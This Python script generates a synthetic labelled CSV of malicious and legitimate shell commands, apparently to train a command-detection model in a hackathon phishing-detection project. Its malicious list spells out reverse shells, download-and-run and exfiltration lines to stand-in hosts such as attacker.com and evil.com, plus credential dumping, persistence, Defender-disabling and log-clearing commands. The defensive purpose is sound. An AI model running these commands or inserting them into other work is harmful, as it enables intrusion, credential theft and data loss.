"""
Generate Synthetic Command Dataset
Based on MITRE ATT&CK patterns and common attack techniques
"""

import random
import csv
import os

OUTPUT_PATH = r"C:\Users\Administrator\Documents\HACKATHON\phishing-detection-system\training\data\raw\command_synthetic.csv"

MALICIOUS_COMMANDS = [
    # Obfuscation
    "cmd /c whoami",
    "cmd /c dir",
    "powershell -enc IEX",
    "powershell -enc Invoke-Expression",
    "bash -c whoami",
    "bash -c ls",
    "python -c exec(base64.b64decode",
    "perl -e 'eval pack",
    "ruby -e 'eval",
    "cmd /c echo hello",
    "powershell -enc SGVsbG8=",
    "cmd /c dir C:\\",
    "bash -c cat /etc/passwd",
    "python3 -c __import__('os').system",
    
    # Remote Download
    "curl http://malicious.com/payload.sh",
    "wget http://evil.net/backdoor",
    "Invoke-WebRequest -Uri http://bad.com/tool.exe -OutFile payload.exe",
    "Invoke-RestMethod http://attacker.com/data",
    "powershell -Command Invoke-WebRequest",
    "curl -s http://domain.com/payload | bash",
    "wget -O /tmp/malware http://hack.me/shell",
    "certutil -urlcache -f http://bad.com/malware.exe",
    "bitsadmin /transfer downloa http://evil.com/bad.exe",
    "ftp http://malicious.com/script.txt",
    
    # Base64/Encoding
    "powershell -enc SGVsbG8gV29ybGQh",
    "echo JTI1Q29kZSUyNTIwPQ== | base64 -d",
    "FromBase64String JABhAGwA",
    "powershell -Command [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String",
    "python -c import base64; exec(base64.b64decode",
    "bash -c echo Y29tYW5k | base64 -d",
    
    # Reverse Shell
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "nc -e /bin/bash attacker.com 4444",
    "nc -e cmd.exe attacker.com 4444",
    "bash -c 'exec bash -i &'",
    "python -c import socket,subprocess;s=socket.socket();s.connect(('attacker.com',4444))",
    "perl -MIO -e '$p=fork;exit,if$p;'",
    "php -r '$s=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/p",
    
    # File Operations
    "echo malicious >> ~/.bashrc",
    "echo */5 * * * * curl http://evil.com/cron.sh | bash >> /etc/crontab",
    "echo world > /tmp/hacked.txt",
    "certutil -encode payload.bin encoded.txt",
    "cmd /c type password.txt",
    "powershell Out-File -FilePath evil.ps1",
    "> /tmp/backup.sh",
    "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
    "cmd /c copy evil.dll %SystemRoot%\\System32\\",
    "move malware.exe C:\\Windows\\System32\\",
    
    # Privilege Escalation
    "sudo su",
    "sudo -s",
    "chmod 777 /etc/passwd",
    "chmod 777 /etc/shadow",
    "whoami /priv",
    "whoami /all",
    "net user admin admin123 /add",
    "net localgroup Administrators admin /add",
    "powershell -Command Start-Process cmd.exe -Verb RunAs",
    "psexec -s -d -h cmd.exe",
    "getprivs",
    "enablepsremote",
    
    # Persistence
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d",
    "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d",
    "schtasks /create /tn AutoRun /tr malicious.exe /sc onlogon",
    "schtasks /create /tn Update /tr curl http://evil.com/update.sh /sc daily",
    "crontab -e * * * * * curl http://bad.com/script.sh",
    "echo '* * * * * /tmp/malware' >> /etc/cron.d/backdoor",
    "launchctl load -w /Library/LaunchAgents/com.evil.plist",
    "powershell -Command Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
    
    # Reconnaissance
    "whoami",
    "ipconfig",
    "ipconfig /all",
    "netstat -an",
    "netstat -ano",
    "systeminfo",
    "tasklist",
    "dir C:\\",
    "ls -la /",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "arp -a",
    "nbtstat -A",
    "nslookup",
    "ping -n 1 127.0.0.1",
    
    # Credential Access
    "mimikatz sekurlsa::logonpasswords",
    "mimikatz privilege::debug sekurlsa::msv",
    "LaZagne.exe all",
    "wce-universal.exe",
    "pwdump.exe",
    "fgdump",
    "reg save HKLM\\SAM sam.hive",
    "reg save HKLM\\SYSTEM system.hive",
    "powershell -Command Get-Process lsass",
    
    # Lateral Movement
    "psexec \\\\target -u admin -p password cmd.exe",
    "wmic /node:targetpath process call create",
    "winrm quickconfig",
    "powershell -Command Invoke-Command -ComputerName target -ScriptBlock",
    "net use \\\\target\\c$ /user:admin password",
    "smbexec target",
    
    # Data Exfiltration
    "curl -X POST -d @secret.txt http://attacker.com/exfil",
    "wget --post-file=data.db http://evil.com/upload",
    "powershell -Command Invoke-WebRequest -Uri http://bad.com -Method POST -Body (Get-Content secret)",
    "ftp -s:commands.txt attacker.com",
    "nc -w 3 attacker.com 4444 < sensitive.txt",
    
    # Disable Security
    "netsh advfirewall set allprofiles state off",
    "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true",
    "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend /v Start /t REG_DWORD /d 4",
    "sc stop WinDefend",
    "bcdedit /set nointegritychecks on",
    "mountvol X: /d",
    
    # Clear Tracks
    "del /q /f C:\\Windows\\Temp\\*",
    "rm -rf /tmp/*",
    "history -c",
    "wevtutil cl Security",
    "wevtutil cl System",
    "Clear-EventLog -LogName Security",
]

LEGITIMATE_COMMANDS = [
    # File Operations
    "ls",
    "ls -la",
    "ls -l",
    "pwd",
    "cd /home",
    "cd Documents",
    "mkdir newfolder",
    "rm oldfile.txt",
    "cp file1.txt file2.txt",
    "mv oldname newname",
    "cat file.txt",
    "head file.txt",
    "tail file.txt",
    "grep pattern file.txt",
    "chmod 755 script.sh",
    "chmod +x script.sh",
    "touch newfile.txt",
    "find . -name *.txt",
    "tar -xvf archive.tar.gz",
    "zip -r backup.zip folder/",
    
    # Git Operations
    "git status",
    "git add .",
    "git commit -m 'update'",
    "git push origin main",
    "git pull origin main",
    "git clone https://github.com/project/repo.git",
    "git checkout main",
    "git branch -a",
    "git log --oneline",
    "git diff",
    "git stash",
    "git stash pop",
    "git merge feature-branch",
    
    # Docker
    "docker ps",
    "docker images",
    "docker build -t myapp .",
    "docker run -d myapp",
    "docker exec -it container_id bash",
    "docker-compose up -d",
    "docker-compose down",
    "docker volume ls",
    "docker network ls",
    "docker logs container_id",
    
    # Kubernetes
    "kubectl get pods",
    "kubectl get services",
    "kubectl get nodes",
    "kubectl apply -f deployment.yaml",
    "kubectl delete pod name",
    "kubectl describe pod name",
    "kubectl logs pod_name",
    "kubectl exec -it pod_name -- /bin/bash",
    "kubectl create deployment app --image=nginx",
    "kubectl scale deployment app --replicas=3",
    
    # Python/Node
    "python script.py",
    "python3 app.py",
    "pip install package",
    "pip install -r requirements.txt",
    "pip list",
    "pip freeze > requirements.txt",
    "python -m venv env",
    "python -c 'print(\"hello\")'",
    "pip uninstall package",
    "python manage.py runserver",
    
    "npm install",
    "npm start",
    "npm run build",
    "npm test",
    "npm init -y",
    "npm install package",
    "npm list",
    "npm update",
    "node server.js",
    "npx create-react-app myapp",
    
    # System Info
    "uname -a",
    "uname -r",
    "cat /etc/os-release",
    "df -h",
    "free -m",
    "top",
    "ps aux",
    "ps -ef",
    "kill process_id",
    "killall process_name",
    
    # Network (Legitimate)
    "curl https://api.github.com",
    "curl https://jsonplaceholder.typicode.com/posts",
    "wget https://example.com/file.zip",
    "ping -c 4 google.com",
    "ssh user@server.com",
    "scp file.txt user@server:/path",
    "rsync -av source dest",
    "telnet mail.server.com 25",
    
    # Package Manager
    "apt update",
    "apt install package",
    "apt upgrade",
    "apt search keyword",
    "yum install package",
    "yum update",
    "dnf install package",
    "brew install package",
    "choco install package",
    
    # Text Editing
    "echo hello > file.txt",
    "printf 'text' > file.txt",
    "cat > script.sh <<EOF",
    "sed -i 's/old/new/g' file.txt",
    "awk '{print $1}' file.txt",
    "vim file.txt",
    "nano file.txt",
    "code file.txt",
    
    # Archive/Compression
    "tar -czvf archive.tar.gz folder/",
    "tar -xzvf archive.tar.gz",
    "gunzip file.gz",
    "bzip2 file.txt",
    "7z x archive.7z",
    
    # Development Tools
    "make build",
    "make clean",
    "cmake ..",
    "gcc -o output source.c",
    "g++ -std=c++11 -o app main.cpp",
    "javac Main.java",
    "java Main",
    "go build",
    "cargo build",
    
    # Misc Legitimate
    "crontab -l",
    "crontab -e",
    "service nginx status",
    "systemctl status nginx",
    "systemctl start nginx",
    "systemctl restart nginx",
    "tail -f /var/log/syslog",
    "watch -n 1 'command'",
    "date",
    "cal",
    "which python",
    "whereis python",
    "env",
    "export VAR=value",
    "source .bashrc",
]

def generate_dataset():
    print("[GENERATING SYNTHETIC COMMAND DATASET]")
    
    data = []
    
    for cmd in MALICIOUS_COMMANDS:
        data.append({"command": cmd, "label": 1, "category": "malicious"})
    
    for cmd in LEGITIMATE_COMMANDS:
        data.append({"command": cmd, "label": 0, "category": "legitimate"})
    
    variations = [
        "powershell -Command {0}",
        "cmd /c {0}",
        "/bin/bash -c '{0}'",
        "sh -c '{0}'",
        "{0} 2>&1",
        "{0} &",
        "nohup {0} &",
    ]
    
    new_malicious = []
    for cmd in MALICIOUS_COMMANDS[:15]:
        for v in variations[:3]:
            new_cmd = v.format(cmd)
            new_malicious.append({"command": new_cmd, "label": 1, "category": "malicious"})
    
    new_legitimate = []
    for cmd in LEGITIMATE_COMMANDS[:20]:
        for v in variations[:2]:
            new_cmd = v.format(cmd)
            new_legitimate.append({"command": new_cmd, "label": 0, "category": "legitimate"})
    
    data.extend(new_malicious)
    data.extend(new_legitimate)
    
    random.shuffle(data)
    
    os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
    
    with open(OUTPUT_PATH, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=['command', 'label', 'category'])
        writer.writeheader()
        writer.writerows(data)
    
    print(f"  Generated: {len(data)} commands")
    print(f"  Malicious: {sum(1 for d in data if d['label'] == 1)}")
    print(f"  Legitimate: {sum(1 for d in data if d['label'] == 0)}")
    print(f"  Saved to: {OUTPUT_PATH}")
    
    return data

if __name__ == "__main__":
    generate_dataset()